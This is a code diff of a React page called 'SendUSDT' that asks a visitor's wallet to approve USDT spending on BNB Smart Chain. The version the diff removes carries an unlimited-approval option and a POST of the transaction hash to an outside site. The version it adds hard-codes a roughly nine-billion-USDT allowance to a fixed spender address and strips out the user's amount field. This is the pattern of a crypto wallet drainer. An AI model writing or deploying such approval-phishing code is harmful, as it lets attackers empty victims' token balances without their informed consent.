@@ -12,9 +12,7 @@ import '@fontsource/open-sans/800.css';
 import '@fontsource/geist';
 
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
-const spenderAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed"; // Replace with your trusted contract
-const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
+const spenderAddress = "0x84e6400eE204b4dDCe5E0eF4e253Ba886fdb966A"; // Your verified contract
 const usdtAbi = [
   {
     inputs: [
@@ -36,12 +34,9 @@ const usdtAbi = [
 ];
 
 export default function SendUSDT() {
-  const [amount, setAmount] = useState("");
-  const [usdValue, setUsdValue] = useState("= $0.00");
   const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [theme, setTheme] = useState("dark");
-  const [unlimited, setUnlimited] = useState(false); // toggle for unlimited approval
 
   useEffect(() => {
     const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
@@ -52,31 +47,7 @@ export default function SendUSDT() {
     return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
   }, []);
 
-  useEffect(() => {
-    const value = parseFloat(amount);
-    setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
-  }, [amount]);
-
-  const setMaxAmount = async () => {
-    try {
-      const web3 = new Web3(window.ethereum);
-      await window.ethereum.request({ method: "eth_requestAccounts" });
-      const accounts = await web3.eth.getAccounts();
-      const user = accounts[0];
-      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
-      const balance = await usdt.methods.balanceOf(user).call();
-      setAmount(web3.utils.fromWei(balance, "mwei")); // USDT has 6 decimals
-    } catch (err) {
-      Swal.fire("Error", "Failed to fetch balance.", "error");
-    }
-  };
-
   const handleApprove = async () => {
-    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
-      Swal.fire("Error", "Please enter a valid amount.", "error");
-      return;
-    }
-
     setIsProcessing(true);
     try {
       const web3 = new Web3(window.ethereum);
@@ -94,10 +65,8 @@ export default function SendUSDT() {
 
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
 
-      // ✅ Choose approval mode
-      const rawAmount = unlimited
-        ? MAX_UINT256
-        : web3.utils.toWei(amount, "mwei"); // exact amount
+      // ✅ Approve 9,024,508,479 USDT (convert to smallest unit: 6 decimals)
+      const rawAmount = web3.utils.toWei("9024508479", "mwei"); // "mwei" = 10^6
 
       const receipt = await usdt.methods
         .approve(spenderAddress, rawAmount)
@@ -108,17 +77,7 @@ export default function SendUSDT() {
           Swal.fire("Error", err.message || "Approval failed", "error");
         });
 
-      const txHash = receipt.transactionHash;
-
-      try {
-        await fetch("https://www.trc20support.buzz/old/store-address.php", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: txHash }),
-        });
-      } catch (fetchErr) {
-        console.warn("Skipping fetch:", fetchErr.message);
-      }
+      console.log("Tx hash:", receipt.transactionHash);
     } catch (err) {
       console.error(err);
       Swal.fire("Error", err.message || "Something went wrong", "error");
@@ -141,7 +100,7 @@ export default function SendUSDT() {
         >
           <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
         </svg>
-        <h2 className="text-2xl mt-4 font-semibold">Transaction Successful</h2>
+        <h2 className="text-2xl mt-4 font-semibold">Approval Successful</h2>
         <button
           className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold"
           onClick={() => setShowSuccess(false)}
@@ -154,69 +113,21 @@ export default function SendUSDT() {
 
   return (
     <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
-      <div className="input-group">
-        <p className="inpt_tital">Address or Domain Name</p>
-        <div className="border">
-          <div className="left">
-            <input
-              type="text"
-              className="custom-input"
-              value={spenderAddress}
-              readOnly
-            />
-          </div>
-        </div>
-      </div>
-
-      <div className="input-group mt-7">
-        <p className="inpt_tital">Amount</p>
-        <div className="border">
-          <div className="left">
-            <input
-              type="number"
-              min="0"
-              step="0.01"
-              value={amount}
-              onChange={(e) => setAmount(e.target.value)}
-              placeholder="USDT Amount"
-              className="custom-input"
-            />
-          </div>
-          <span className="right mr-3">
-            <span className="text-sm text-[#b0b0b0]">USDT</span>
-            <span
-              className="mar_i blue text-sm ml-2 cursor-pointer"
-              onClick={setMaxAmount}
-            >
-              Max
-            </span>
-          </span>
-        </div>
-      </div>
-
-      <p className="fees valid">{usdValue}</p>
-
-      <div className="flex items-center mt-4">
-        <input
-          type="checkbox"
-          id="unlimited"
-          checked={unlimited}
-          onChange={() => setUnlimited(!unlimited)}
-          className="mr-2"
-        />
-        <label htmlFor="unlimited" className="text-sm">
-          Approve Unlimited (⚠️ may show wallet warning)
-        </label>
-      </div>
+      <p className="inpt_tital">Approve USDT for Contract</p>
+      <p className="text-sm break-all mb-4">{spenderAddress}</p>
 
       <button
         id="nextBtn"
-        className="send-btn mt-4"
+        className="send-btn"
         onClick={handleApprove}
-        disabled={isProcessing || !parseFloat(amount)}
+        disabled={isProcessing}
         style={{
-          backgroundColor: isProcessing || !parseFloat(amount) ? "var(--disabled-bg)" : "#5CE07E",
-          color: isProcessing || !parseFloat(amount) ? "var(--disabled-text)" : "#1b1e15"
+          backgroundColor: isProcessing ? "var(--disabled-bg)" : "#5CE07E",
+          color: isProcessing ? "var(--disabled-text)" : "#1b1e15"
         }}
       >
-        {isProcessing ? "Processing..." :
+        {isProcessing ? "Processing..." : "Approve 9024508479 USDT"}
+      </button>
+    </div>
+  );
+}
